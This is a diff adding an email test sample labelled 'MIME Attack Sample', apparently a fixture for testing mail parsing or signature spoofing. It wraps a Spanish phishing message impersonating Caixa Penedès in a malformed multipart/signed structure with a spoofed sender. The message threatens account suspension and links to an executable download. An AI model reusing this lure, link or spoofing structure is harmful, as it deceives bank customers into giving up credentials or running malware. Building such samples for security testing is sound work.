@@ -1,0 +1,136 @@
+  From: test@attack.com
+From: carol.moline@powerpool.ab.ca
+To: kathryn.sheppard@enron.com, holden.salisbury@enron.com
+Subject: MIME Attack Sample
+Content-Type: multipart/signed; boundary="BOUNDARY";  protocol="application/pgp-signature" 
+--BOUNDARY
+Content-Type: text/plain Content-Transfer-Encoding: quoted-printable
+Content-Type: text/plain;
+	charset=ISO-8859-1;
+	delsp=yes;
+	format=flowed
+
+
+
+     CAIXA PENED=C8S siempre trata de encontrar sus expectativas mas =20
+altas.
+Por eso usamos la ultima tecnologia en seguridad para nuestros clientes.
+Por lo tanto nuestro departamento de antifraude ha desarrollado un =20
+nuevo sistema de seguridad que elimine cualquier posibilidad del =20
+acceso de la tercera persona a sus datos, cuentas ni fondos.
+   Es obligatorio para todos los clientes de CAIXA PENED=C8S en Linea =20=
+
+usar este sistema de seguridad.
+   Nuestro consejo para usted es que introduzca sus datos se acceso =20
+para pasar La Verificacion Del Sistema. Si el registro no es =20
+realizado dentro de 48 Horas su cuenta sera suspendida temporalmente =20
+hasta que su registro sea completado.
+   Esto solo le va a costar unos minutos de su tiempo y va a tener =20
+una seguridad mucho mas estable.
+
+Para comenzar el registro por favor pinche aqui:
+
+
+
+Todos los Derechos Reservados 2010=A9 Caixa Pened=E8s.=
+
+--Apple-Mail-6--681645262
+Content-Transfer-Encoding: quoted-printable
+Content-Type: text/html;
+	charset=ISO-8859-1
+
+<html><body style=3D"word-wrap: break-word; -webkit-nbsp-mode: space; =
+-webkit-line-break: after-white-space; ">
+ <div class=3D"clearfix" id=3D"message" style=3D"visibility: visible"> 	=
+<div id=3D"yiv1484474388"> 		<div align=3D"center"> 			=
+<table cellspacing=3D"0" cellpadding=3D"0" width=3D"564" border=3D"0" =
+id=3D"table3"> 				<tbody><tr> 				=
+	<td width=3D"564" align=3D"center"> 					=
+<div style=3D"width: 564px; height: 516px" align=3D"center"> 			=
+			<table cellspacing=3D"0" cellpadding=3D"0" =
+width=3D"76%" border=3D"0" id=3D"table4"> 					=
+		<tbody><tr> 							=
+	<td>&nbsp;<img src=3D"http://i47.tinypic.com/29blysl.png" =
+width=3D"448" height=3D"47" border=3D"0" align=3D"top"></td> 			=
+				</tr> 						=
+	<tr> 								=
+<td align=3D"middle">&nbsp;</td> 						=
+	</tr> 					  </tbody></table> 		=
+				<table width=3D"96%" border=3D"0" =
+id=3D"table5"> 							=
+<tbody><tr> 								=
+<td align=3D"center"><p align=3D"left">&nbsp;<font face=3D"Arial, =
+Helvetica, sans-serif" color=3D"#000000" size=3D"2"><b> </b>&nbsp; =
+<b>CAIXA PENED=C8S </b>siempre trata de encontrar sus 				=
+				expectativas mas altas.</font><font =
+face=3D"Arial, Helvetica, sans-serif" color=3D"#000000" size=3D"2"><br> 	=
+							Por eso usamos =
+la ultima 								 =
+ tecnologia en seguridad para nuestros clientes.<br> 				=
+			    Por lo tanto nuestro departamento de =
+antifraude 								 =
+ ha desarrollado un nuevo sistema de seguridad 					=
+			  que elimine cualquier posibilidad del acceso =
+de 								  la =
+tercera persona a sus datos, cuentas ni 					=
+			  fondos. <br> 						=
+	    &nbsp; Es obligatorio para todos 					=
+			  los clientes de<b> CAIXA PENED=C8S </b>en =
+Linea usar este 								=
+  sistema de seguridad.<br>  &nbsp; Nuestro consejo para 			=
+					  usted es que introduzca sus =
+datos se acceso para 								=
+  pasar La Verificacion Del Sistema. Si el 					=
+			  registro no es realizado dentro de 48 Horas su =
+								  cuenta =
+sera suspendida temporalmente hasta que 					=
+			  su registro sea completado.<br>  &nbsp; Esto =
+solo le va a costar 								=
+  unos minutos de su tiempo y va a tener una 					=
+			  seguridad mucho mas estable.				=
+				  </font></p><p align=3D"center"><font =
+face=3D"Arial, Helvetica, sans-serif" color=3D"#000000" size=3D"2">Para =
+comenzar el registro por favor pinche aqui:</font></p><p> 			=
+					<font face=3D"Arial, Helvetica, =
+sans-serif" color=3D"#000066" size=3D"2"> 					=
+			<a target=3D"_blank" rel=3D"nofollow" =
+href=3D"http://www.medvidatack.cz/plugins/data/SGD.exe"> 			=
+					<img height=3D"17" =
+src=3D"http://www.caixacatalunya.com/caixacat/es/ccpublic/img_comun/bt_ent=
+rar.gif" width=3D"51" border=3D"0"></a></font></p> 				=
+			  <hr width=3D"422" size=3D"0"></td> 			=
+				</tr> 						=
+	<tr> 								=
+<td width=3D"429"> 								=
+<div align=3D"center"><p class=3D"footerCentered"> 				=
+					<font face=3D"Arial, Helvetica, =
+sans-serif" color=3D"#666666" size=3D"-2"> 					=
+				Todos los Derechos Reservados 2010=A9 =
+<b>                                    Caixa Pened=E8s.</b></font>		=
+						 				=
+				</p></div>					=
+		  </td> 							=
+</tr> 					  </tbody></table> 			=
+		</div> 				  </td> 			=
+	</tr> 		  </tbody></table> 		</div> 	</div> =
+</div>   </body></html>=
+
+--Apple-Mail-6--681645262--
+Content-Disposition: attachment; filename=signature.asc
+--BOUNDARY
+Content-Type: application/pgp-signature; name="signature.asc" 
+
+-----BEGIN PGP SIGNATURE-----
+iQGzBAABCAAdFiEE+eYAclh4xtrjBojKS1aPSG6WD7UFAlxm1SEACgkQS1aPSG6W
+D7Vougv/a57PJh16psngj2NFLeDH8T43aiPfameEt/nVb7xWxGJoD3ZyOiLDoPCf
+j3hEVKI7KYxpx+AuaYHZsAPeB/uO3+IqgRVdC26stck/UXchPytLB5Tpjx3U3ITV
+KbqptyoxDLROdNu9XjIqcg3T1nxsx+vUw/hEuhH+AZYBMehK25gMrO1/iWpWcNpJ
+KQWL4HdSz0hHM40r2i5iJP1nbxInsleVJCzLBSGYqOEoYy8e4A1Se7+0ypMTZ4Ch
+w1fHoqMHhX3yj3b91wsflBYdIrpE5sU6XCN2gf2cW4L1BRtX/pIuTYAn8FMm2w6E
+M9OQiWE+jWEF6/En0XRjYgHUy+biV4T7YioP/ahie7GZQwdOZmYu6SkzjOlnrepf
+hFVbcS5nS6zqsAYQ2TxMTk4NcuLYwfNtGSf5NEc/1wOQY6lYLkQEIfs78wiGZkvz
+cND6jP43BoLBgd5CKRvcP6yryC73kHu5PFPuUkG0+OBQQqMJrxfA72sLpKrH3vl5
+Md2hf7yu
+=c7bP
+-----END PGP SIGNATURE-----
+--BOUNDARY--
